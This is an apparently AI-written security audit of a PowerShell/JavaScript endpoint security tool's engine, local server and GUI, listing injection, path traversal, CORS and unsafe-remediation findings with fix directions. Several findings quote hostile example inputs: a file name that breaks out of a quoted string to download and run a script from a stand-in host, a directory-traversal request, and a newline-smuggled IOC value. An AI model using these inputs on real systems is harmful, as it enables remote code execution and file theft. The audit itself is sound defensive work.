# ZeroBreach Security & Hygiene Audit — 2026-08-18

**Scope:** Full read-only audit of the live PowerShell/HTML-JS ZeroBreach stack (engine, server, GUI)
by 5 parallel independent reviewers, plus repo-hygiene triage. Triggered by an untracked
`zerobreach-main/` folder dropped into the repo, believed to be a newer project version.

**Verdict on `zerobreach-main/`:** it was NOT a newer version of the project. It contained zero
source code — only a Rust/Tauri `native-app` build cache (`target/debug/`, no `Cargo.toml`, no
`.rs` files anywhere) and two real client scan-report HTML files. The Tauri rewrite is evidently
planned future work (per the user: "the engine itself will be a chore to implement... will
literally change the entire way the app works") but no source for it exists on this machine.
Contents were archived to `_archive/zerobreach-main-dump/` (gitignored — see `.gitignore`) rather
than compared against, since there was nothing to compare.

**This document is notes only — nothing below has been fixed.** Per instruction, findings are
for another Claude instance (Opus/Fable) to act on. Do not treat this as already remediated.

---

## CRITICAL

### C1. `RunCmd` remediation is vulnerable to PowerShell injection via unescaped single-quote interpolation
**Files:** `engine/Phases-1.ps1` (lines ~239, 433, 820, 828, 1079), `engine/Phases-2.ps1` (~168, 211,
792, 801, 834), `engine/Phases-3.ps1` (~852, 985, 996) — FixParam builders; executed by
`engine/FixMode.ps1:666-670` via `[scriptblock]::Create($f.FixParam); & $sb` (functionally
`Invoke-Expression`).

Many phases build a `RunCmd` FixParam by interpolating **attacker-controllable strings** (file
names, process names, service names, scheduled-task names, registry value names, WMI filter/
consumer names, Defender exclusion paths) directly into single-quoted PowerShell string literals
**without escaping embedded single quotes**. A malware author who names their artifact something
like `evil'; IEX(New-Object Net.WebClient).DownloadString('http://x/p.ps1');'` gets that string
recorded verbatim in a finding, and the moment an operator clicks "remediate" on that specific
finding, the quote breaks out of the literal and executes attacker code with the tool's elevated
privileges. This turns *correct detection + operator-approved remediation of a real threat* into
code execution — directly undermining User Rule #1 ("must NEVER auto-select or auto-apply anything
that damages the system").

**The fix pattern already exists in the codebase, just isn't applied everywhere:**
- `Phases-1.ps1:479-484` (Phase 17, ADS): `$adsFile = $s.FileName -replace "'","''"` — correct.
- `Phases-1.ps1:776-777` (Phase 29, rogue scheduled task): `$taskNameEsc = $task.TaskName -replace "'","''"` — correct.

**Unescaped sites (each independently exploitable):**
| File:Line | Phase / context | Interpolated value |
|---|---|---|
| Phases-1.ps1:239 | Phase 9, browser-shortcut hijack fix | `$lnk.FullName` |
| Phases-1.ps1:433 | Phase 15, System32 rename | `$sf.FullName` (also see C2 below — may bypass Test-ProtectedTarget entirely) |
| Phases-1.ps1:820, 828 | WMI permanent-subscription cleanup | `$fName`/`$cName` (`__EventFilter`/`__EventConsumer` Name — fully attacker-defined in real WMI persistence) |
| Phases-2.ps1:168 | Process kill | `$proc.Name` |
| Phases-2.ps1:211 | Phase 64, miner scheduled-task persistence | `$task.TaskName` (same finding class as the already-fixed Phase 29, just not reused) |
| Phases-2.ps1:792, 801 | Defender exclusion removal | `$exc` |
| Phases-2.ps1:834 | Service disable | `$svcName` |
| Phases-3.ps1:852 | IFEO/Accessibility-backdoor debugger key removal | `$ifeo` (attacker-set registry key name) |
| Phases-3.ps1:985, 996 | Security Control Tamper restore | `$es.name`, `$dv.key`, `$dv.name` |
| Phases-1.ps1:1079 | Firewall rule disable | `$rule.Name` |

**Confirmed safe (no fix needed, listed for contrast):** Phases-1.ps1:1106/1119 (cert `Thumbprint`
— hex only), Phases-1.ps1:849 (BITS `JobId` — GUID), Phases-1.ps1:1265 (Phase 45 — hardcoded
6-item engine list, not attacker input).

**Suggested fix direction:** centralize the existing `-replace "'","''"` idiom into a shared helper
(e.g. `ConvertTo-PsSingleQuoteSafe`), require every `RunCmd`/similar FixParam builder that
interpolates filesystem/registry/process/task/service/WMI-enumerated data to use it, and consider
a dev-time assertion in `Add-Finding` that rejects a `RunCmd` FixParam with an unbalanced quote
count as a regression guard.

### C2. Default checkbox state pre-selects POSSIBLE-severity findings for execution
**File:** `ZeroBreach-V23.ps1:531` — `Add-Finding`: `Selected = ($Severity -ne "INFO")`

CLAUDE.md states as a hard rule: "Only CRITICAL/HIGH + a destructive FixAction is auto-selected
for remediation — POSSIBLE is shown but never auto-acted-on." The actual code pre-checks every
non-INFO finding — CRITICAL, HIGH, **and POSSIBLE** — with no gating on FixAction type at all.
This is the standalone/native engine's Fix Mode UI (`Show-GUICheckboxMenu` /
`Show-LiveScanDashboard` / `Show-ShellCheckboxMenu`, all of which read `.Selected` for initial
checkbox state), distinct from the server's remediation flow.

**Failure scenario:** an operator opens Fix Mode and clicks "EXECUTE SELECTED FIXES" without
manually unchecking every item — remediation runs on unconfirmed POSSIBLE findings, including
`DeleteFile`/`DeleteReg`/`KillProcess`/`RunCmd`, i.e. exactly the detection class the project's own
FP-tuning rounds exist because it's known to misfire.

**Needs cross-check:** whether `gui/static/js/app.js`'s server-driven remediation flow
independently re-implements the correct CRIT/HIGH-only rule, or inherits this same broad default
via a `finding.selected`-style field from the API.

### C3. `Get-FixClass` mislabels `KillProcess` and `RunCmd` as "SAFE"
**File:** `ZeroBreach-V23.ps1:1176-1177` — `$safe = @('Info','RunCmd','KillProcess','Quarantine')`

`RunCmd` executes an attacker/detection-controlled string as a live scriptblock (see C1).
`KillProcess` force-terminates a process on a POSSIBLE-confidence match with no unsaved-state
consideration. Neither is "safe" in the sense an operator clicking the "🛡 SAFE ONLY" preset button
(`FixMode.ps1:298-315`) would expect. CLAUDE.md itself calls the WS2 email-hardening `RunCmd`
actions "opt-in" — not enforced here.

Also: `$destructive = @('DeleteFile','DeleteReg')` (same line) is assigned but **never referenced**
anywhere in the function — dead code — and `DeleteRegKey` is absent from both lists, so it's
silently untagged either way. Suggests an intended stricter gate was never wired in.

---

## HIGH

### H1. Path traversal / arbitrary file read via `/static/` route
**File:** `ZeroBreach-Server.ps1:1176-1180`
```powershell
'^/static/' {
    $rel = $path -replace '^/static/', ''
    $rel = $rel -replace '/', '\'
    Send-StaticFile $Ctx (Join-Path $script:GUI_DIR "static\$rel")
}
```
No `..` sanitization; `Send-StaticFile` (line 184) only does `Test-Path -PathType Leaf` then reads
bytes — no post-join containment check. `GET /static/../../../../Windows/System32/drivers/etc/hosts`
(or encoded `..%5c` variants — a known HttpListener/Uri-normalization bypass class) can read any
file readable by the server process, which self-elevates at startup. Every other route
(`/api/report`, `/api/remediate`) properly strips path components via
`[System.IO.Path]::GetFileName()` first; this route is the outlier. **Fix:** resolve the joined
path with `[System.IO.Path]::GetFullPath()` and verify it still starts with the static root before
serving. Needs live testing to confirm whether HttpListener normalizes `..`/encoded variants before
this is reachable — the missing containment check is a bug regardless of exact exploit mechanics.

### H2. Wildcard CORS + zero authentication on a file-delete/reg-delete/process-kill/RunCmd-capable API
**File:** `ZeroBreach-Server.ps1` — `Write-JsonResponse` (line 175), `Send-StaticFile` (line 197),
SSE headers (line 506) all set `Access-Control-Allow-Origin: *`. Since the frontend is served
same-origin by this same server, wildcard CORS serves no legitimate purpose — it only adds attack
surface. Any other tab/page open in the operator's browser can `fetch()`/open an `EventSource` to
`localhost:<port>` and read `/api/sysinfo` (hostname/username/OS/Defender status), read
`/api/report` (full findings incl. real file paths — omitting `?name=` falls back to the latest
report, no guessing needed), and `POST /api/scan/start` / `/api/remediate`. `Get-FreePort`
randomizing the port per launch helps somewhat (vs. the Python server's predictable
`start=5000` — see L2), but a malicious local page can still port-scan localhost via timing.
**Recommend removing the CORS headers outright** (same-origin doesn't need them), or scoping to
`http://localhost:$Port` if there's an undocumented reason to keep them.

### H3. `KillProcess` remediation trusts a stale PID with no re-validation — PID-reuse can kill the wrong process
**File:** `ZeroBreach-Server.ps1` — `Test-ProtectedTarget`/`Test-RProtected` (341-375, 1024-1035)
only regex-match the *description string* captured at scan time; the actual kill (1088-1097) calls
`Get-Process -Id $procId` purely to log the name **after** already committing to killing that PID.
If the original process exits between scan and remediation (plausible — scans take minutes,
remediation is a manual follow-up), Windows can recycle that PID to an unrelated, potentially
critical process. Nothing re-examines what's *currently* running under that PID. This risks
violating User Rule #1 through ordinary OS timing, no attacker required. **Fix:** before killing,
re-resolve the live process's image path/name and compare against what the finding recorded; abort
on mismatch.

### H4. Command-line injection into a UAC-elevated relaunch
**File:** `ZeroBreach-V23.ps1:93-103` — `$argList` is built by string concatenation of `-IocFile`,
`-Baseline`, `-OutDir` (no `ValidateSet`, no quote-stripping) into one command-line string, passed
whole to `Start-Process powershell $argList -Verb RunAs`. Any of these three values containing an
embedded `"` (e.g. an IOC-file path set via the IOC Manager web UI, `GET|POST /api/ioc`) can break
out of its quoted argument and inject additional `powershell.exe` switches into the elevated
relaunch — still gated behind a UAC "Yes" click, but the injected content isn't what the user
approved. `Mode`/`Schedule` are safe (constrained by `[ValidateSet(...)]`); `IocFile`/`Baseline`/
`OutDir` have no such constraint.

### H5. Same injection pattern, unattended, at SYSTEM level, in scheduled-task registration
**File:** `ZeroBreach-V23.ps1:113-116` — `$argBase` concatenates `OutDir`, `SmtpTo`, `SmtpFrom`,
`SmtpServer` the same way, fed to `New-ScheduledTaskAction -Execute "powershell.exe" -Argument
$argBase`, registered with `-UserId "SYSTEM" -RunLevel Highest` (line 123). Worse than H4: this
task fires unattended at 02:00 with no human approval step. If any of these four values is ever
populated from a less-trusted source (saved profile, future settings UI), this becomes silent
SYSTEM-level command injection. **Fix direction (H4+H5):** don't hand-build a single command-line
string; reject embedded `"`/`` ` `` in these params at bind time, or build argument arrays and let
`Start-Process`/`New-ScheduledTaskAction` handle quoting per element.

### H6. `DeleteFile` FixAction is irreversible and always passes `-Recurse`
**File:** `engine/FixMode.ps1:623-636` — `Remove-Item -Path $f.FixParam -Recurse -Force
-ErrorAction Stop`. Two issues: (a) nothing is backed up before deletion — CLAUDE.md's own rule
("prefer Quarantine over DeleteFile for anything not hash-confirmed") isn't enforced in code, only
left to phase authors' discipline; (b) `-Recurse` is unconditional with no check that `FixParam` is
a single file (no `PSIsContainer` check). If `FixParam` ever resolves to a directory (symlink/
junction, or a future phase bug), this silently becomes a recursive directory delete — exactly what
User Rule #1 forbids as auto-selectable. **Combined with C2** (POSSIBLE findings pre-checked by
default), a false-positive `DeleteFile` pointing at a directory would auto-delete a tree with zero
recovery path. This is the most severe compounding risk found in the audit.

### H7. `Test-ProtectedTarget` likely doesn't inspect `RunCmd` scriptblock contents
`Phases-1.ps1:433` builds a `RunCmd` that renames a file inside System32 — a documented
hard-blocked path. `Test-ProtectedTarget` most plausibly keys off FixAction+Target for path-based
actions (`DeleteFile`/`DeleteReg`/`KillProcess`); a `RunCmd` is an opaque scriptblock string. It's
unconfirmed whether the protection layer parses `RunCmd` content for protected-path references
before executing — if it doesn't, this finding (and others: Winlogon Shell/Userinit fixes at
Phases-1.ps1:632/638, SAM/LSA hardening writes at 1148/1157/1281/1286) would execute even under the
"hard block" promise. **Needs verification against `FixMode.ps1`/`ZeroBreach-Server.ps1`'s actual
`Test-ProtectedTarget` implementation** (both copies, per the sync-requirement CLAUDE.md already
documents).

---

## MEDIUM

### M1. `_python/server.py` reimplements the exact bug CLAUDE.md documents as already fixed on the PS server
**File:** `_python/server.py:86-100, 197-210` — still does old text-severity → finding
classification, which CLAUDE.md says was replaced 2026-07-02 because it produced zero live findings
on real DEEP runs. No `[FINDING]` structured-line handling exists in this file at all. Also:
`PHASE_RE` (line 62) only matches integer phases (no `(?:\.\d+)?`), so fractional phases
(55.5/74.5-.7/99.5) are silently dropped from progress tracking. `MODE_PHASES` (line 59) caps
DEEP/PARANOID/STEALTH at 107, but the engine is now 115 phases. This file is non-functional
relative to the current engine, not just "lower priority" — flag for a decision on whether to fix
in parallel with the PS server going forward, or formally mark as unmaintained/archive it too.

### M2. IOC line-injection via unescaped newlines in the flat-text IOC file
**File:** `ZeroBreach-Server.ps1:1278-1286` — hash/ip/domain/regex/file values are written straight
into `custom_iocs.ioc` as `"$prefix:$value"` with no rejection of embedded `\r`/`\n`. An IOC field
with an embedded newline (e.g. a "domain" value of `evil.com\nfile:C:\Windows\System32`) forges an
extra, differently-typed IOC line the operator never intended. The JSON sidecar is unaffected
(JSON escapes newlines) — only the engine text format is vulnerable. **Fix:** reject/strip `\r`/`\n`
from each field before writing.

### M3. Race condition: concurrent scan/remediation starts
**File:** `ZeroBreach-Server.ps1` — `/api/scan/start` (1390) and `/api/remediate` (1219-1220) both
check-then-act on `$script:State.Running`/`.Remediating`, but the flag only flips `$true` **inside**
the async runspace (697 for scan, 1037 for remediate), after `Start-Runspace` has already returned.
Two rapid POSTs can both pass the check before either runspace sets the flag, launching concurrent
scans/remediations that corrupt shared state (Findings, EventLog, ScanEpoch) — risking corrupted
evidence during a real incident. **Fix:** set the flag synchronously on the main thread before
spawning the runspace.

### M4. Report-JSON has no integrity check before `RunCmd` execution
**File:** `ZeroBreach-Server.ps1:1098-1103` — `[scriptblock]::Create("$($f.FixParam)")` invoked
directly; comment claims FixParam is "generated by our own engine into the trusted report file,"
but `reports/KrakenBaseline_*.json` has no signature/checksum. If the deployment folder is ever
writable by a lower-privileged local process, a local attacker could plant/tamper a report, and the
next remediate click executes arbitrary PowerShell elevated. Needs cross-check against C1 for what
FixParam content phases actually emit.

### M5. `FixMode.ps1` and `Summary.ps1` lack the module-level `trap` the other engine modules have
Confirmed via grep: the only `trap { Write-RecoveredError $_; continue }` across the whole engine
family outside Phases-1/2/3 is the loader's script-scope one (`ZeroBreach-V23.ps1:87`). Dot-source
order is `Phases-1 → Phases-2 → Phases-3 → Summary.ps1 → FixMode.ps1`. CLAUDE.md documents this
exact bug class (Phase-16 ACL collision silently dropping phases 17-58) as the reason every module
needs its own trap. Concrete scenario: an uncaught terminating error partway through `Summary.ps1`
(most of it is `-ErrorAction SilentlyContinue`-guarded, but not all — e.g. line 104's
`ConvertTo-Json` call, the HTML-report string-building block) skips **all of `FixMode.ps1`** in a
normal interactive run: the operator sees "audit complete," the process just ends, no remediation
UI, no error surfaced anywhere. **Fix:** add the standard trap as the first statement of both files.

### M6. Rollback snapshot only covers 5 registry keys — no file-system coverage
**File:** `engine/FixMode.ps1:28-34` — snapshot exports `Run` (HKCU/HKLM), `Services`, `Winlogon`,
`CLSID` only. Any `DeleteFile`, `DeleteRegKey` (arbitrary key — not on this list), or `KillProcess`
has no pre-action snapshot; the operator-facing rollback instructions only cover the 5 listed
paths. Combined with H6/C2, a false-positive `DeleteFile` has no rollback path at all.

### M7. `Get-WinEvent -FilterHashtable` called raw instead of `Get-WinEventSafe` in Phase 107
**File:** `engine/Phases-3.ps1:645, 673, 697` — three event-log threat-hunting calls (4624/4688/
7045) bypass the documented safe wrapper. Each has its own inline try/catch so it isn't currently
crash-prone, but it's an unexplained deviation from a rule stated as load-bearing elsewhere.
Side effect: `-ErrorAction Stop` + zero-matching-events also throws a terminating error on a clean
box, so Phase 107 prints "QUERY FAILED (ACCESS DENIED OR EMPTY LOG)" instead of "[OK] clean" on a
healthy machine — cosmetic, no findings lost, but worth fixing for log clarity. Resolve by either
extending `Get-WinEventSafe` to accept `-MaxEvents`, or documenting Phase 107 as a sanctioned
exception.

### M8. `data/coverage_matrix.json` doc/data mismatch
The file's own `_comment` claims "re-audited 2026-07-02 against the split engine," but CLAUDE.md's
file-structure table still says "re-audit pending; was generated against the work-rig engine." One
of these is wrong. **Note-only — do not move the file** (it's live data the engine's phase-mapping
may reference); needs a human/Opus decision on which statement is current truth, then fix whichever
is stale.

---

## LOW / NOTE

- **L1.** `app.js:1095` interpolates `finding.id` into an HTML attribute (`data-id="${finding.id}"`)
  without `escapeHtml()`, unlike every other rendered field. Needs cross-check against how `id` is
  generated in `Add-Finding` (engine, out of the frontend fork's scope) — confirm it's a strictly
  numeric/hash token that can never contain `"`/`<`/`>`. If it can be influenced by a crafted
  filename/registry-value, this is a stored-XSS vector in the findings tree.
- **L2.** `app.js:1069, 1463` render `threat_type`/`groupName` without `escapeHtml()` — currently
  safe (fixed server-side enum) but no client-side defense-in-depth if that ever changes. Cheap fix:
  wrap both anyway.
- **L3.** `escapeHtml()` (`app.js:1613-1617`) doesn't neutralize `javascript:`-scheme URLs; used to
  sanitize `href` in `mitreBadge()` (`app.js:1225`). Not currently exploitable (local
  `mitre_mapping.json` data only), but the helper isn't URL-safe — a future caller reusing it for a
  less-trusted `href`/`src` inherits the gap silently.
- **L4.** `gui/templates/index.html:34-35` load GSAP/Chart.js from `cdnjs.cloudflare.com` with no
  Subresource Integrity. Given this is a self-elevated, admin-running local tool on the same origin
  as a destructive `/api/remediate` endpoint, a compromised/MITM'd CDN response gets full
  script-context access. Trivial fix: pin version + add `integrity`/`crossorigin`.
- **L5.** `_python/server.py:35` (`cors_allowed_origins="*"`) + predictable sequential port from
  `start=5000` (345-350) makes H2's cross-origin exposure trivially exploitable with no port
  guessing, if this server is ever run instead of the default. Strictly worse than the PS server's
  version of the same issue.
- **L6.** `_python/server.py:34` — hardcoded Flask `SECRET_KEY = "zerobreach-kraken-2024"` committed
  in source. Not currently exploitable (nothing uses session/cookie auth), bad hygiene regardless.
- **L7.** `_python/server.py:324-326` — `/api/reports/<filename>` has no extension/pattern
  allowlist (unlike the PS server's `^(KrakenBaseline_|audit_).*\.json$`); `send_from_directory`
  blocks `..` traversal but serves any file in `reports/` by exact name.
- **L8.** `Phases-1.ps1:247` — `ConvertFrom-Json -ErrorAction SilentlyContinue` on a live Chrome
  `Preferences` file (Phase 9). CLAUDE.md documents this exact PS 5.1 gotcha (can still throw a
  terminating error) as a server-side rule (`Read-JsonBody`) — unclear if it's meant to be
  engine-wide too. If Chrome's Preferences file is ever corrupted mid-write, this could throw;
  currently caught by the surrounding QUICK-skip block's trap, so low practical impact.
- **L9.** `Phases-1.ps1:476` (Phase 17, ADS scan) enumerates `Get-Item -Path "$adsDir\*" -Stream *`
  directly against AppData/Temp/Downloads rather than via `Get-ScanFiles` — non-recursive so the
  worst case doesn't apply, but it's outside the documented cap/prune/deadline machinery every
  other phase uses. Worth a comment explaining the exemption or wrapping for consistency.
- **L10.** Possible duplicated cryptominer-scheduled-task detection logic across two phases in
  `Phases-2.ps1` (~59 area and Phase 64) with slightly different regex breadth — may be intentional
  defense-in-depth, but only one of the two applies the C1 quote-escaping fix; confirm intentional.
- **L11.** `app.js:1533` — MSP/KRAKEN keystroke listener doesn't check `event.isTrusted`, so
  synthetic `KeyboardEvent`s can flip MSP mode or replay the cinematic. Cosmetic impact only
  (theme/sound/badge) — informational, not worth fixing unless it ever gates something real.
- **L12.** `ZeroBreach-Server.ps1:1392-1399` (`/api/scan/start`) duplicates the terminating-error-safe
  JSON parse pattern inline instead of calling the existing `Read-JsonBody` helper. Functionally
  equivalent as written, but it's the one call site not using the shared helper — consolidate for
  consistency.
- **L13.** `Get-EngineReportFindings` (`ZeroBreach-Server.ps1:381`) doesn't bound response size when
  serializing `$report.Findings` — a very large/tampered report could produce a large-response DoS.
  Low priority, ties into M4.

---

## Things independently verified as SOUND (no bug — noted so a fix pass doesn't re-flag them)

- PURGE danger-confirm gate (`app.js:1178-1206`): single deterministic string compare, button stays
  disabled until exact match, no bypass path found.
- Protected/vendor-trusted enforcement on the frontend is correctly implemented as
  belt-and-suspenders only (checkbox hard-disabled, excluded from Select-All/POST) with the real
  boundary understood to be server-side — matches CLAUDE.md's description.
- All attacker-reachable finding text is otherwise consistently passed through `escapeHtml()` before
  DOM insertion — the L1-L3 gaps are exceptions, not the pattern.
- No `eval`/`new Function`/`document.write`; no server-templating mismatch; single static
  `index.html` served by both servers as documented.
- Report-name fetch relies on server-side filename validation, not client-side — correct trust
  boundary placement.
- Across Phases-1/2/3.ps1: no `(fn)[0]` scalar-unwrap bug, no `(try{}catch{})` sub-expression, no
  bare `exit`, no raw `Get-AuthenticodeSignature`/`Get-ItemPropertyValue`/`Get-FileHash`, every
  `Get-ScanFiles` call correctly parenthesized before piping, every QUICK-skip/grouped-`if` block
  carries its own module-level trap (20+ locations verified) — full compliance with CLAUDE.md's
  documented historical-bug rules except M7.
- No AMSI-risk literal malware signatures embedded in the phase files — all IOC/signature lists
  externalized via globals, consistent with the data-file rule.
- Severity/FixAction pairing in the detection phases is otherwise well-disciplined — no CRITICAL/
  HIGH+destructive finding attached to a genuinely weak/ambiguous signal; ambiguous signals are
  consistently downgraded to POSSIBLE/Info per the project's stated FP philosophy. (C2/H6 above are
  about the *execution* layer ignoring this discipline, not the detection layer itself.)

---

## Repo hygiene — actions taken this session

Moved to `_archive/` (git history preserved via `git mv`, nothing deleted):
`NEXT_STEPS.md`, `UPGRADE_PLAN.md` (both self-marked "superseded 2026-07-02" — BLUEPRINT.md §7 is
now the authoritative roadmap), `NIGHT_RUN_PLAN.md` (one-time overnight-run plan, fully executed,
its fixes long since standard practice), `TIME_LOG.md`/`.csv`/`.xlsx` (dated snapshot from
2026-07-03, 6+ weeks and multiple commits stale, not a living doc), `claude working files` (stray
~1-byte tracked file, no content, no references anywhere).

Kept at root (confirmed still active/load-bearing): `HANDOFF.md` (living doc, matches current
Outstanding Work), `client_alerts/` (actively written to by the `ingest-malware-alert` skill),
`tools/*` (both wired to active workflows), `exfiltrate.ps1` (active personal dev-sync tool — the
exact mechanism that produced the last successful work-rig port), `.claude/skills/`, `README.md`/
`BLUEPRINT.md`/`CHANGELOG.md` (current, most-recently-touched docs in the repo).

`zerobreach-main/` contents moved to `_archive/zerobreach-main-dump/`, gitignored (see `.gitignore`
— both the 335MB Rust build cache and, redundantly, the reports via the pre-existing global
`reports/` rule). **Recommend outright deletion of the `native-app/src-tauri/target/` build cache**
(335MB, fully reproducible from a future `cargo build`, zero source alongside it to give it any
value) — archived instead of deleted per your "keep just in case" instruction, but there's genuinely
nothing to lose by deleting it whenever you're ready. The two report HTMLs were kept for your
planned verification against the source PC, as requested.

**Not moved — flag only:** `data/coverage_matrix.json` (see M8 — doc/data mismatch, needs a
judgment call, not a file move). `_python/server.py` (see M1 — functionally behind the PS server,
your call whether to fix in parallel or formally deprecate).
